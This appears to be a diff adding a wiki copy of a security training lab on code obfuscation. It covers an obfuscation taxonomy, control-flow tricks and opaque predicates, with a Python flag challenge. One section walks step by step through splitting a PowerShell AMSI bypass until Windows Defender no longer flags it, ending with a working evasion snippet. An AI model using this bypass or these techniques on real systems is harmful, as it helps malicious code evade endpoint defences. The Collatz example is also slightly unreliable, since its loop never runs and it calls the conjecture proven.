@@ -1,0 +1,500 @@
+<!--
+title: Obfuscation techniques
+description: 
+published: true
+date: 2022-12-25T22:49:29.544Z
+tags: 
+editor: ckeditor
+dateCreated: 2022-12-25T22:49:29.544Z
+-->
+
+<h1>Introduction</h1>
+<p>Obfuscation is an essential component of detection evasion methodology and preventing analysis of malicious software. Obfuscation originated to protect software and intellectual property from being stolen or reproduced. While it is still widely used for its original purpose, adversaries have adapted its use for malicious intent.</p>
+<p>In this room, we will observe obfuscation from multiple perspectives and break down obfuscation methods.</p>
+<figure class="image image_resized" style="width:141.24px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/3dd905a363f9b95560b5d0f7dc250ac5.png" alt="decorative image of an eye"></figure>
+<h3>Learning Objectives</h3>
+<ol>
+  <li>Learn how to evade modern detection engineering using tool-agnostic obfuscation</li>
+  <li>Understand the principles of obfuscation and its origins from intellectual property protection</li>
+  <li>Implement obfuscation methods to hide malicious functions</li>
+</ol>
+<h1>Origins of Obfuscation</h1>
+<p>Obfuscation is widely used in many software-related fields to protect <strong>IP</strong> (<strong>I</strong>ntellectual <strong>P</strong>roperty) and other proprietary information an application may contain.</p>
+<p>For example, the popular game: Minecraft uses the obfuscator&nbsp;<a href="https://github.com/Guardsquare/proguard">ProGuard</a> to obfuscate and minimize its Java classes. Minecraft also releases&nbsp;<strong>obfuscation maps</strong> with limited information as a translator between the old un-obfuscated classes and the new obfuscated classes to support the modding community.</p>
+<p>This is only one example of the wide range of ways obfuscation is publicly used. To document and organize the variety of obfuscation methods, we can reference the <a href="https://cybersecurity.springeropen.com/track/pdf/10.1186/s42400-020-00049-3.pdf">Layered obfuscation: a taxonomy of software obfuscation techniques for layered security paper</a>. This research paper organizes obfuscation methods by <strong>layers</strong>, similar to the OSI model but for application data flow. Below is the figure used as the complete overview of each taxonomy layer.</p>
+<figure class="image image_resized" style="width:717.797px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/42fdab7091783f27a58c26c7b82ec09a.png" alt="Diagram showing the four layers of the layered obfuscation taxonomy: Code-Element Layer, Software-Component Layer, Inter-Component Layer, and Application layer"></figure>
+<p>Each sub-layer is then broken down into specific methods that can achieve the overall objective of the sub-layer.</p>
+<p>In this room, we will primarily focus on the <strong>code-element layer</strong> of the taxonomy, as seen in the figure below.</p>
+<figure class="image image_resized" style="width:732.5px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/246ac1239f25ea18b52459ad9de5610c.png" alt="Diagram showing sub-layers of the Code-Element Layer: Obfuscating Layout, Obfuscating Controls, Obfuscating Data, Obfuscating Methods, and Obfuscating Classes"></figure>
+<p>To use the taxonomy, we can determine an objective and then pick a method that fits our requirements. For example, suppose we want to obfuscate the layout of our code but cannot modify the existing code. In that case, we can inject junk code, summarized by the taxonomy:</p>
+<p style="text-align:center;"><code>Code Element Layer</code> &gt; <code>Obfuscating Layout</code> &gt; <code>Junk Codes</code>.</p>
+<p>But how could this be used maliciously? Adversaries and malware developers can leverage obfuscation to break signatures or prevent program analysis. In the upcoming tasks, we will discuss both perspectives of malware obfuscation, including the purpose and underlying techniques of each.</p>
+<h1>Obfuscation's Function for Static Evasion</h1>
+<p>Two of the more considerable security boundaries in the way of an adversary are <strong>anti-virus engines</strong> and <strong>EDR</strong> (<strong>E</strong>ndpoint <strong>D</strong>etection &amp; <strong>R</strong>esponse) solutions. As covered in the <a href="https://tryhackme.com/room/introtoav">Introduction to Anti-virus room</a>, both platforms will leverage an extensive database of known signatures referred to as <strong>static</strong> signatures as well as <strong>heuristic</strong> signatures that consider application behavior.</p>
+<p>To evade signatures, adversaries can leverage an extensive range of logic and syntax rules to implement obfuscation. This is commonly achieved by abusing data obfuscation practices that hide important identifiable information in legitimate applications.</p>
+<p>The aforementioned white paper: <a href="https://cybersecurity.springeropen.com/articles/10.1186/s42400-020-00049-3">Layered Obfuscation Taxonomy</a>, summarizes these practices well under the <strong>code-element </strong>layer. Below is a table of methods covered by the taxonomy in the <strong>obfuscating data </strong>sub-layer<strong>.</strong></p>
+<figure class="image image_resized" style="width:385.391px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/10577cd43a7c96046b9c69764cf3b575.png" alt="Diagram showing the objectives of the Obfuscating Data Sub-Layer: Array Transformation, Data Encoding, Data Procedurization, and Data Splitting/Merging"></figure>
+<p>&nbsp;</p>
+<figure class="table" style="width:1164px;">
+  <table style="background-color:rgb(255, 255, 255);border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);">
+    <tbody>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><strong>Obfuscation Method</strong></td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><strong>Purpose</strong><br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Array Transformation<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Transforms an array by splitting, merging, folding, and flattening<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Data Encoding<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Encodes data with mathematical functions or ciphers<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Data Procedurization<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Substitutes static data with procedure calls<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Data Splitting/Merging<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Distributes information of one variable into several new variables<br>&nbsp;</td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+<p>In the upcoming tasks, we will primarily focus on <strong>data splitting/merging</strong>; because static signatures are weaker, we generally only need to focus on that one aspect in initial obfuscation.</p>
+<p>Check out the Encoding/Packing/Binder/Crypters room for more information about <strong>data encoding,</strong> and the <a href="https://tryhackme.com/room/signatureevasion">Signature Evasion room</a> for more information about <strong>data procedurization</strong> and <strong>transformation</strong>.</p>
+<h1>Object Concatenation</h1>
+<p><i><u>Solution Walkthrough (Click to read)</u></i><br>To begin trying to clean this code snippet we need to break it down and understand where the alerts are originating.</p>
+<p>We can break the snippet where each cmdlet is present (<code>GetField</code>, <code>SetValue</code>)</p>
+<ol>
+  <li><code>[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')</code></li>
+  <li><code>[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static')</code></li>
+  <li><code>[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)</code></li>
+</ol>
+<p>Let’s execute the first code snippet and see what PowerShell returns.</p>
+<pre><code class="language-plaintext">PS M:\\&gt; [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+At line:1 char:1
++ [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
+</code></pre>
+<p>Nothing surprising there… we can break this snippet up further by breaking up the .NET assembly and seeing which part results in an alert.</p>
+<pre><code class="language-plaintext">PS M:\\&gt; [Ref].Assembly.GetType('System')
+PS M:\\&gt; [Ref].Assembly.GetType('System.Management')
+PS M:\\&gt; [Ref].Assembly.GetType('System.Management.Automation')
+PS M:\\&gt; [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+At line:1 char:1
++ [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
+</code></pre>
+<p>We now know that <code>AmsiUtils</code> is contributing directly to the alert. Next, we can target it with concatenation to break it up and attempt to make this section clean.</p>
+<pre><code class="language-plaintext">PS M:\\&gt; [Ref].Assembly.GetType('System.Management.Automation.'+'Amsi'+'Utils')
+
+IsPublic IsSerial Name                                     BaseType
+-------- -------- ----                                     --------
+False    False    AmsiUtils                                System.Object
+</code></pre>
+<p>Success! Now we can append our next snippet to this clean version of the first snippet and execute it.</p>
+<pre><code class="language-plaintext">PS M:\\&gt; [Ref].Assembly.GetType('System.Management.Automation.'+'Amsi'+'Utils').GetField('amsiInitFailed','NonPublic,Static')
+At line:1 char:1
++ [Ref].Assembly.GetType('System.Management.Automation.'+'Amsi'+'Utils' ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
+</code></pre>
+<p>Now this snippet may be harder to track down…. With some prior knowledge of PowerShell we can assume that <code>NonPublic</code> and <code>Static</code> are both pretty standard and would not contribute to the signature. We can assume <code>amsiInitFailed</code> is what Defender is alerting on and attempt to split it.</p>
+<pre><code class="language-plaintext">PS M:\\&gt; [Ref].Assembly.GetType('System.Management.Automation.'+'Amsi'+'Utils').GetField('amsi'+'Init'+'Failed','No'+'nPublic,S'+'tatic')
+
+Name                   : amsiInitFailed
+MetadataToken          : 67114384
+[snip]
+...
+[snip]
+IsSecurityTransparent  : False
+CustomAttributes       : {}
+</code></pre>
+<p>Success! Now we can append our next snippet to this clean version of the first and second snippet and execute it.</p>
+<pre><code class="language-plaintext">PS M:\\&gt; [Ref].Assembly.GetType('System.Management.Automation.'+'Amsi'+'Utils').GetField('amsi'+'Init'+'Failed','No'+'nPublic,S'+'tatic').SetValue($null,$true)
+At line:1 char:1
++ [Ref].Assembly.GetType('System.Management.Automation.'+'Amsi'+'Utils' ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
+
+PS M:\\&gt;
+</code></pre>
+<p>This is interesting, there doesn’t seem to be any parameter values that would contribute to this alert? This must mean that Defender is alerting on the presence of each cmdlet together to determine it is a malicious snippet. To solve this problem we need to separate the cmdlet(s) from the rest of the snippet. This technique is known as separation of related code and is often seen along with concatenation, we will cover this concept further in task 8.</p>
+<pre><code class="language-plaintext">PS M:\\&gt; $Value="SetValue"
+PS M:\\&gt; [Ref].Assembly.GetType('System.Management.Automation.'+'Amsi'+'Utils').GetField('amsi'+'Init'+'Failed','No'+'nPublic,S'+'tatic').$Value($null,$true)
+PS M:\\&gt;
+</code></pre>
+<p>Success! There are no more alerts so we now have a clean snippet that we can use! Submit this clean code snippet to <code>http://10.10.77.186</code> and obtain the flag.</p>
+<h1>Obfuscation's Function for Analysis Deception</h1>
+<p>After obfuscating basic functions of malicious code, it may be able to pass software detections but is still susceptible to human analysis. While not a security boundary without further policies, analysts and reverse engineers can gain deep insight into the functionality of our malicious application and halt operations.</p>
+<p>Adversaries can leverage advanced logic and mathematics to create more complex and harder-to-understand code to combat analysis and reverse engineering.</p>
+<p>For more information about reverse engineering, check out the <a href="https://tryhackme.com/module/malware-analysis">Malware Analysis module</a>.</p>
+<p>The aforementioned white paper: <a href="https://cybersecurity.springeropen.com/articles/10.1186/s42400-020-00049-3">Layered Obfuscation Taxonomy</a>, summarizes these practices well under other sub-layers of the <strong>code-element layer</strong>. Below is a table of methods covered by the taxonomy in the <strong>obfuscating layout</strong> and <strong>obfuscating controls sub-layers</strong>.</p>
+<figure class="image image_resized" style="width:362.812px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/180c008b9c27d83650181d0703586302.png" alt="Diagram showing the objectives of the Obfuscating Layer sub-layer: junk codes, separation of related codes, stripping redundant symbols, and meaningless identifiers"></figure>
+<p style="text-align:center;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</p>
+<figure class="image image_resized" style="width:382.281px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/80e480508a64290f424a4409d2270799.png" alt="Diagram showing the objectives of the Obfuscating Controls sub-layer: implicit controls, dispatcher-based controls, probabilistic control flows, and bogus control flows"></figure>
+<p>&nbsp;</p>
+<figure class="table" style="width:1164px;">
+  <table style="background-color:rgb(255, 255, 255);border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);">
+    <tbody>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><strong>Obfuscation Method</strong><br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><strong>Purpose</strong><br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Junk Code<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Add junk instructions that are non-functional, also known as a code stubs<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Separation of Related Code<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Separate related codes or instructions to increase difficulty in reading the program<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Stripping Redundant Symbols<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Strips symbolic information such as debug information or other symbol tables<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Meaningless Identifiers<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Transform a meaningful identifier to something meaningless<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Implicit Controls<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Converts explicit controls instructions to implicit instructions<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Dispatcher-based Controls<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Determines the next block to be executed during the runtime<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Probabilistic Control Flows<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Introduces replications of control flows with the same semantics but different syntax<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Bogus Control Flows<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Control flows deliberately added to a program but will never be executed<br>&nbsp;</td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+<p>In the upcoming tasks, we will demonstrate several of the above methods in an agnostic format.</p>
+<p>Check out the <a href="https://tryhackme.com/room/sandboxevasion">Sandbox Evasion room</a> for more information about anti-analysis and anti-reversing</p>
+<h1>Code Flow and Logic</h1>
+<p><strong>Control flow</strong> is a critical component of a program’s execution that will define how a program will logically proceed.&nbsp;<strong>Logic</strong> is one of the most significant determining factors to an application’s control flow and encompasses various uses such as&nbsp;<strong>if/else statements</strong> or&nbsp;<strong>for loops</strong>. A program will traditionally execute from the top-down; when a logic statement is encountered, it will continue execution by following the statement.</p>
+<p>Below is a table of some logic statements you may encounter when dealing with control flows or program logic.</p>
+<figure class="table" style="width:1164px;">
+  <table style="background-color:rgb(255, 255, 255);border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);">
+    <tbody>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><strong>Logic Statement</strong><br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><strong>Purpose</strong><br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">if/else<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Executes only <strong>if</strong> a condition is met, <strong>else</strong> it will execute a different code block<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">try/catch<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Will <strong>try</strong> to execute a code block and <strong>catch</strong> it if it fails to handle errors.<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">switch case<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">A <strong>switch</strong> will follow similar conditional logic to an if statement but checks several different possible conditions with <strong>cases</strong> before resolving to a <strong>break</strong> or <strong>default</strong><br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">for/while loop<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">A <strong>for </strong>loop will execute for a set amount of a condition. A <strong>while</strong> loop will execute until a condition is no longer met.<br>&nbsp;</td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+<p>To make this concept concrete, we can observe an example function and its corresponding <strong>CFG</strong> (<strong>C</strong>ontrol <strong>F</strong>low <strong>G</strong>raph) to depict it’s possible control flow paths.</p>
+<pre><code class="language-python">x = 10 
+if(x &gt; 7):
+	print("This executes")
+else:
+	print("This is ignored")
+</code></pre>
+<figure class="image image_resized" style="width:326.5px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/cfc2504b9a4a76682d724413080e3729.png" alt="Control flow diagram showing two different logical paths"></figure>
+<p>What does this mean for attackers? An analyst can attempt to understand a program’s function through its control flow; while problematic, logic and control flow is almost effortless to manipulate and make arbitrarily confusing. When dealing with control flow, an attacker aims to introduce enough obscure and arbitrary logic to confuse an analyst but not too much to raise further suspicion or potentially be detected by a platform as malicious.</p>
+<p>In the upcoming task, we will discuss different control flow patterns an attacker can use to confuse an analyst.</p>
+<h1>Arbitrary Control Flow Patterns</h1>
+<p>To craft <strong>arbitrary control flow patterns</strong> we can leverage <strong>maths</strong>, <strong>logic</strong>, and/or other <strong>complex algorithms</strong> to inject a different control flow into a malicious function.</p>
+<p>We can leverage&nbsp;<strong>predicates</strong> to craft these complex logic and/or mathematical algorithms. Predicates refer to the decision-making of an input function to return&nbsp;<strong>true</strong> or&nbsp;<strong>false</strong>. Breaking this concept down at a high level, we can think of a predicate similar to the condition an if statement uses to determine if a code block will be executed or not, as seen in the example in the previous task.</p>
+<p>Applying this concept to obfuscation,&nbsp;<strong>opaque predicates</strong> are used to control a known output and input. The paper,&nbsp;<a href="https://etda.libraries.psu.edu/files/final_submissions/17513">Opaque Predicate: Attack and Defense in Obfuscated Binary Code</a>, states, “An opaque predicate is a predicate whose value is known to the obfuscator but is difficult to deduce. It can be seamlessly applied with other obfuscation methods such as junk code to turn reverse engineering attempts into arduous work.” Opaque predicates fall under the&nbsp;<strong>bogus control flow</strong> and&nbsp;<strong>probabilistic control flow</strong> methods of the taxonomy paper; they can be used to arbitrarily add logic to a program or refactor the control flow of a pre-existing function.</p>
+<p>&nbsp;</p>
+<p>The topic of opaque predicates requires a deeper understanding of mathematics and computing principles, so we will not cover it in-depth, but we will observe one common example.</p>
+<figure class="image image_resized" style="width:384px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/c1a1b8196a13becaa1efec050260c81b.png" alt="Control flow diagram showing the various logical paths of the collatz conjecture"></figure>
+<p>The&nbsp;<strong>Collatz Conjecture</strong> is a common mathematical problem that can be used as an example of an opaque predicate. It states: If two arithmetic operations are repeated, they will return one from every positive integer. The fact that we know it will always output one for a known input (a positive integer) means it is a viable opaque predicate. For more information about the Collatz conjecture, refer to the&nbsp;<a href="https://mathworld.wolfram.com/CollatzProblem.html">Collatz Problem</a>. Below is an example of the Collatz conjecture applied in Python.</p>
+<pre><code class="language-python">x = 0
+while(x &gt; 1):
+	if(x%2==1):
+		x=x*3+1
+	else:
+		x=x/2
+	if(x==1):
+		print("hello!") </code></pre>
+<p>In the above code snippet, the Collatz conjecture will only perform its mathematical operations if <code>x &gt; 1</code>, resulting in <code>1</code> or <code>TRUE</code>. From the definition of the Collatz problem, it will always return one for a positive integer input, so the statement will always return true if <code>x</code> is a positive integer greater than one.</p>
+<p>&nbsp;</p>
+<p>To prove the efficacy of this opaque predicate, we can observe its&nbsp;<strong>CFG</strong> (<strong>C</strong>ontrol&nbsp;<strong>F</strong>low&nbsp;<strong>G</strong>raph) to the right. If this is what an interpreted function looks like, just imagine what a compiled function may look like to an analyst.</p>
+<hr>
+<p>Using the knowledge you have accrued throughout this task, put yourself into the shoes of an analyst and attempt to decode the original function and output of the code snippet below.</p>
+<p>If you correctly follow the print statements, it will result in a flag you can submit.</p>
+<p>&nbsp;</p>
+<p><i><u>Challenge Code Snippet (Click to view)</u></i></p>
+<pre><code class="language-python">x = 3
+swVar = 1
+a = 112340857612345
+b = 1122135047612359087
+i = 0
+case_1 = ["T","d","4","3","3","3","e","1","g","w","p","y","8","4"]
+case_2 = ["1a","H","3a","4a","5a","3","7a","8a","d","10a","11a","12a","!","14a"]
+case_3 = ["1b","2b","M","4b","5b","6b","c","8b","9b","3","11b","12b","13b","14b"]
+case_4 = ["1c","2c","3c","{","5c","6c","7c","8c","9c","10c","d","12c","13c","14c"]
+case_5 = ["1d","2d","3d","4d","D","6d","7d","o","9d","10d","11d","!","13d","14d"]
+case_6 = ["1e","2e","3e","4e","5e","6e","7e","8e","9e","10e","11e","12e","13e","}"]
+
+while (x &gt; 1):
+    if (x % 2 == 1):
+        x = x * 3 + 1
+    else:
+        x = x / 2
+    if (x == 1):
+        for y in case_1:
+            match swVar:
+                case 1:
+                    print(case_1[i])
+                    a = 2
+                    b = 214025
+                    swVar = 2
+                case 2:
+                    print(case_2[i])
+                    if (a &gt; 10):
+                        swVar = 6
+                    else:
+                        swVar = 3
+                case 3:
+                    print(case_3[i])
+                    b = b + a
+                    if (b &lt; 10):
+                        swVar = 5
+                    else:
+                        swVar = 4
+                case 4:
+                    print(case_4[i])
+                    b -= b
+                    swVar = 5
+                case 5:
+                    print(case_5[i])
+                    a += a
+                    swVar = 2
+                case 6:
+                    print(case_5[11])
+                    print(case_6[i])
+                    break
+            i = i + 1 </code></pre>
+<h1>Protecting and Stripping Identifiable Information</h1>
+<p>﻿Identifiable information can be one of the most critical components an analyst can use to dissect and attempt to understand a malicious program. By limiting the amount of identifiable information (variables, function names, etc.), an analyst has, the better chance an attacker has they won't be able to reconstruct its original function.</p>
+<p>At a high level, we should consider three different types of identifiable data: code structure, object names, and file/compilation properties. In this task, we will break down the core concepts of each and a case study of a practical approach to each.</p>
+<hr>
+<h3>Object Names</h3>
+<p>Object names offer some of the most significant insight into a program's functionality and can reveal the exact purpose of a function. An analyst can still deconstruct the purpose of a function from its behavior, but this is much harder if there is no context to the function.</p>
+<p>The importance of literal object names may change depending on if the language is&nbsp;<strong>compiled</strong> &nbsp;or&nbsp;<strong>interpreted</strong>. If an interpreted language such as&nbsp;<strong>Python</strong> or&nbsp;<strong>PowerShell</strong>&nbsp;is used, then all objects matter and must be modified. If a compiled language such as&nbsp;<strong>C</strong>&nbsp;or&nbsp;<strong>C#</strong> is used, only objects appearing in the strings are generally significant. An object may appear in the strings by any function that produces an&nbsp;<strong>IO operation</strong>.</p>
